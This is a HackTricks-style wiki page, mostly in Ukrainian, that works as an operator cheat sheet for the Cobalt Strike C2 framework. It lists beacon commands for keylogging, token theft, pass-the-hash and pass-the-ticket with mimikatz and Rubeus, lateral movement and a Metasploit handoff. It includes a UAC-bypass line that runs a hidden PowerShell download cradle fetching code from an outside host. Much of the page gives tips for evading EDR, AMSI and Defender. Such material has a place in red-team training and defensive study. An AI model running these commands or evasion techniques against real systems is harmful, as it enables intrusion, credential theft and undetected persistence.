# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit`, після чого можна вибрати, де прослуховувати з'єднання, який тип beacon використовувати (http, dns, smb...) та інші параметри.

### Peer2Peer Listeners

beacon-и цих listeners не повинні напряму взаємодіяти з C2 — вони можуть передавати через інші beacon-и.

`Cobalt Strike -> Listeners -> Add/Edit`, після чого потрібно вибрати TCP- або SMB-beacon-и.

* **TCP beacon встановить listener на вибраному порту**. Щоб підключитися до TCP beacon, використовуйте команду `connect <ip> <port>` з іншого beacon-а.
* **smb beacon прослуховуватиме pipename із вибраним ім'ям**. Щоб підключитися до SMB beacon, потрібно використати команду `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** для HTA-файлів
* **`MS Office Macro`** для office-документа з macro
* **`Windows Executable`** для .exe, .dll або service .exe
* **`Windows Executable (S)`** для **stageless** .exe, .dll або service .exe (stageless кращий за staged, оскільки має менше IoC)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` згенерує script/executable для завантаження beacon-а з Cobalt Strike у таких форматах, як: bitsadmin, exe, powershell і python.

#### Host Payloads

Якщо файл, який потрібно розмістити, уже є, просто перейдіть до `Attacks -> Web Drive-by -> Host File`, виберіть файл для розміщення та конфігурацію web server-а.

### Beacon Options

<details>
<summary>Опції та команди beacon-а</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- Custom agent має лише підтримувати HTTP/S-протокол Cobalt Strike Team Server (типовий malleable C2 profile), щоб зареєструватися/check-in і отримувати завдання. Реалізуйте ті самі URI/заголовки/криптографію метаданих, визначені у profile, щоб повторно використовувати UI Cobalt Strike для постановки завдань і отримання результатів.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Aggressor Script (наприклад, `CustomBeacon.cna`) може обгортати генерацію payload для non-Windows beacon, щоб оператори могли вибирати listener і безпосередньо створювати ELF payloads із GUI.
- Приклади Linux task handlers, доступних Team Server: `sleep`, `cd`, `pwd`, `shell` (виконання довільних команд), `ls`, `upload`, `download` і `exit`. Вони відповідають task IDs, які очікує Team Server, і мають бути реалізовані на стороні сервера для повернення результатів у належному форматі.
- Підтримку BOF у Linux можна додати, завантажуючи Beacon Object Files in-process за допомогою [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (також підтримує BOF у стилі Outflank), що дає змогу запускати модульний post-exploitation у контексті/з привілеями implant без створення нових процесів.<sup>[[2]](#references)[[3]](#references)</sup>
- Вбудуйте SOCKS handler у custom beacon, щоб зберегти можливості pivoting на рівні Windows Beacons: коли оператор запускає `socks <port>`, implant має відкрити локальний proxy для маршрутизації інструментів оператора через скомпрометований Linux host до внутрішніх мереж.

## Opsec

### Execute-Assembly

**`execute-assembly`** використовує **sacrificial process** із remote process injection для виконання зазначеної програми. Це дуже помітно, оскільки для injection у процес використовуються певні Win APIs, які перевіряє кожен EDR. Однак існують custom tools, за допомогою яких можна завантажити щось у той самий процес:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- У Cobalt Strike також можна використовувати BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Aggressor script `https://github.com/outflanknl/HelpColor` створить у Cobalt Strike команду `helpx`, яка додасть кольори до команд, позначаючи, чи є вони BOFs (зелені), Frok&Run (жовті) тощо, або ProcessExecution, injection тощо (червоні). Це допомагає визначити, які команди є більш stealthy.

### Сучасне in-process post-execution

Recent versions додають дві альтернативи, коли classic COFF BOF є надто обмеженим:

- **Beacon Interpreter** компілює C на Team Server у проміжний bytecode і виконує його у VM, вбудованій у Beacon. Bytecode залишається даними, а не native executable code, тому це усуває потребу в додатковому виділенні executable memory та переході дозволів RW-to-RX, які зазвичай потрібні для завантаження BOF. Scripts можуть імпортувати Beacon API і оголошувати прототипи Dynamic Function Resolution (DFR) у стилі BOF.
- **BOF-PE** завантажує повний EXE або DLL у поточний Beacon. Цей формат підтримує звичайні PE imports, exception handling, складніший C++ і external libraries, зберігаючи Beacon API. Це важчий варіант, ніж невеликий COFF BOF, тому використовуйте його лише тоді, коли додатковий runtime є корисним.
```bash
# Compile a C script on the Team Server and execute its bytecode
beacon-interpreter /path/to/script.c

# Execute a BOF-PE in the current Beacon
inline-execute-pe /path/to/tool.x64.exe
```
Ці механізми зменшують сигнали, пов'язані з loader, але не telemetry, яку створюють дії скрипту або виклики Windows API.<sup>[[8]](#references)</sup>

### Працюйте від імені користувача

Можна перевірити такі події, як `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 — перевірте всі інтерактивні входи, щоб визначити звичайні години роботи.
- System EID 12,13 — перевірте частоту завершення роботи, запуску та переходу в режим сну.
- Security EID 4624/4625 — перевірте вхідні дійсні/недійсні спроби NTLM.
- Security EID 4648 — ця подія створюється, коли для входу використовуються облікові дані у відкритому тексті. Якщо її згенерував процес, binary потенційно містить облікові дані у відкритому вигляді у config-файлі або всередині коду.

Під час використання `jump` у cobalt strike краще застосовувати метод `wmi_msbuild`, щоб новий процес виглядав більш легітимним.

### Використовуйте облікові записи комп'ютерів

Захисники часто перевіряють підозрілу поведінку, створену користувачами, і **виключають service accounts та computer accounts, наприклад `*$`, зі свого моніторингу**. Ці облікові записи можна використовувати для lateral movement або privilege escalation.

### Використовуйте stageless payloads

Stageless payloads створюють менше шуму, ніж staged payloads, оскільки їм не потрібно завантажувати другий stage із C2 server. Це означає, що після початкового з'єднання вони не створюють мережевого трафіку, тому мережевим засобам захисту складніше їх виявити.

### Tokens і Token Store

Будьте обережні під час крадіжки або створення tokens, оскільки EDR може перераховувати thread tokens і виявити **token, що належить іншому користувачеві**, або навіть SYSTEM усередині процесу.

Це дає змогу зберігати tokens **для кожного beacon**, щоб не було потреби знову й знову красти той самий token. Це корисно для lateral movement або коли потрібно багаторазово використовувати викрадений token:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

Під час lateral movement зазвичай краще **викрасти token, а не створювати новий** або виконувати pass the hash attack.

### Guardrails

У Cobalt Strike є функція під назвою **Guardrails**, яка допомагає запобігати використанню певних команд або дій, що можуть бути виявлені захисниками. Guardrails можна налаштувати для блокування конкретних команд, таких як `make_token`, `jump`, `remote-exec` та інших, які часто використовуються для lateral movement або privilege escalation.

Крім того, у repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) також містяться деякі перевірки та ідеї, які можна розглянути перед виконанням payload.

### Шифрування tickets

В AD будьте обережні з шифруванням tickets. За замовчуванням деякі tools використовують шифрування RC4 для Kerberos tickets, яке є менш безпечним за AES, а в актуальних середовищах за замовчуванням використовується AES. Захисники, які відстежують слабкі алгоритми шифрування, можуть це виявити.

### Уникайте значень за замовчуванням

Під час використання Cobalt Stricke за замовчуванням SMB pipes матимуть назви `msagent_####` і `"status_####"`. Змініть ці назви. Перевірити назви наявних pipes у Cobal Strike можна командою: `ls \\.\pipe\`

Крім того, під час SSH sessions створюється pipe з назвою `\\.\pipe\postex_ssh_####`. Змініть її за допомогою `set ssh_pipename "<new_name>";`.

Також під час post-exploitation attack pipes `\\.\pipe\postex_####` можна змінити за допомогою `set pipename "<new_name>"`.

У Cobalt Strike profiles також можна змінити такі параметри:

- Не використовувати `rwx`
- Поведінку process injection (які APIs використовуватимуться) у блоці `process-inject {...}`
- Роботу "fork and run" у блоці `post-ex {…}`
- Час сну
- Максимальний розмір binaries, які завантажуються в memory
- Обсяг memory і вміст DLL за допомогою блоку `stage {...}`
- Мережевий трафік

### Sleepmask і BeaconGate

Sleepmask перетворює Beacon і його відстежувані heap allocations, поки він перебуває в неактивному стані, а потім відновлює їх для виконання завдань. Поточні releases містять evasive default, але custom Sleepmask BOFs залишаються корисними, коли відрізняються вимоги до memory layout, allocation або call stack. Починаючи з версії 4.13, default Sleepmask також підміняє return address для APIs, що проксіюються через BeaconGate.<sup>[[8]](#references)</sup>

**BeaconGate** розширює цю конструкцію за межі `Sleep`: вибрані WinAPI calls представлені як структури `FUNCTION_CALL` і передаються до Sleepmask BOF, який може маскувати Beacon під час виконання виклику. У profile можна передати через gate групу (`Comms`, `Core`, `Cleanup` або `All`) або лише окремі APIs:<sup>[[9]](#references)</sup>
```text
stage {
set sleep_mask "true";
set syscall_method "Indirect";

beacon_gate {
VirtualAlloc;       # Routed through BeaconGate
VirtualAllocEx;
InternetConnectA;
}
}
```
Для API, перелічених у `beacon_gate`, gate має пріоритет над `syscall_method`; API, яких немає в списку, усе ще можуть використовувати налаштований syscall method. `beacon_gate disable` і `beacon_gate enable` перемикають цю функцію під час виконання. Не вмикайте `All` бездумно: команди на кшталт `ps` багаторазово викликають `OpenProcess`/`CloseHandle` і можуть спричинити стрибок використання CPU, коли кожен виклик маскує та розмасковує Beacon. Sleepmask-VS надає змодельований стан Beacon/Sleepmask для налагодження власних gate без їхнього постійного тестування через live implant.<sup>[[9]](#references)</sup>

### Шумні proc injections

Під час ін’єкції коду в процес це зазвичай дуже шумна операція, оскільки **звичайні процеси зазвичай не виконують таких дій, а способи зробити це дуже обмежені**. Тому це можуть виявляти системи виявлення на основі поведінки. Крім того, це можуть виявляти EDR, які сканують мережу на наявність **потоків, що містять код, відсутній на диску** (хоча такі процеси, як браузери, що використовують JIT, часто це роблять). Приклад: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | взаємозв’язки PID і PPID

Під час створення нового процесу важливо **зберігати звичайний зв’язок батьківського та дочірнього процесів**, щоб уникнути виявлення. Якщо svchost.exe запускає iexplorer.exe, це виглядатиме підозріло, оскільки у звичайному середовищі Windows svchost.exe не є батьківським процесом iexplorer.exe.

Коли в Cobalt Strike за замовчуванням створюється новий Beacon, для запуску нового listener створюється процес, що використовує **`rundll32.exe`**. Це не дуже stealthy і може бути легко виявлено EDR. Крім того, `rundll32.exe` запускається без аргументів, що робить його ще підозрілішим.

За допомогою наведеної нижче команди Cobalt Strike можна вказати інший процес для створення нового Beacon, зробивши його менш помітним:
```bash
spawnto x86 svchost.exe
```
You can also change this setting **`spawnto_x86` and `spawnto_x64`** in a profile.

### Proxying attackers traffic

Attackers sometimes need to be able to run tools locally, even on Linux machines, and make the victims' traffic reach the tool (e.g. NTLM relay).

Moreover, sometimes to perform a pass-the-hash or pass-the-ticket attack, it's stealthier for the attacker to **add this hash or ticket to their own LSASS process** locally and then pivot from it instead of modifying an LSASS process on a victim machine.

However, you need to be **careful with the generated traffic**, as you might be sending uncommon traffic (Kerberos?) from your backdoor process. For this, you could pivot to a browser process (although you could get caught injecting yourself into a process, so think about a stealthy way to do this).


### Avoiding AVs

#### AV/AMSI/ETW Bypass

Check the page:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) for the payloads that Cobalt Strike will use to generate the binary beacons.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template), you can find what is causing Defender to trigger. It's usually a string. Therefore, you can simply modify the code that generates the backdoor so that the string doesn't appear in the final binary.

After modifying the code, just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Не забудьте завантажити aggressive script `dist-pipe\artifact.cna`, щоб вказати Cobalt Strike використовувати потрібні нам ресурси з диска, а не завантажені.

#### Resource Kit

Папка ResourceKit містить шаблони для script-based payloads Cobalt Strike, зокрема PowerShell, VBA та HTA.

Використовуючи [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) із шаблонами, можна визначити, що саме не подобається defender (у цьому випадку AMSI), і змінити це:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modifying the detected lines one can generate a template that won't be caught.

Не забудьте завантажити aggressive script `ResourceKit\resources.cna`, щоб вказати Cobalt Strike використовувати потрібні нам ресурси з диска, а не завантажені.

#### Function hooks | Syscall

Function hooking — дуже поширений метод EDR для виявлення шкідливої активності. Cobalt Strike дає змогу обходити ці hooks, використовуючи **syscalls** замість стандартних викликів Windows API за допомогою конфігурації **`None`**, використовувати версію функції `Nt*` із налаштуванням **`Direct`** або просто перестрибувати через функцію `Nt*` за допомогою опції **`Indirect`** у malleable profile. Залежно від системи один варіант може бути stealth-овішим за інший.

Це можна налаштувати у profile або за допомогою команди **`syscall-method`**.

Однак це також може бути шумним.

Одна з можливостей, яку надає Cobalt Strike для обходу function hooks, — видалити ці hooks за допомогою [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Також можна перевірити, які функції hooked, за допомогою [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) або [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Різні команди Cobalt Strike</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>



## References

- [1] [Cobalt Strike Linux Beacon (PoC кастомного implant)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Шаблон nix BOF від Outflank](https://github.com/outflanknl/nix_bof_template)
- [4] [Аналіз шифрування metadata Cobalt Strike від Unit42](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Щоденник SANS ISC про трафік Cobalt Strike](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [CobaltStrikeParser від SentinelOne](https://github.com/Sentinel-One/CobaltStrikeParser)
- [8] [Cobalt Strike 4.13: Загублені в перекладі](https://www.cobaltstrike.com/blog/cobalt-strike-413-lost-in-translation)
- [9] [Cobalt Strike 4.10: Через BeaconGate](https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate?p=6046)
{{#include ../banners/hacktricks-training.md}}
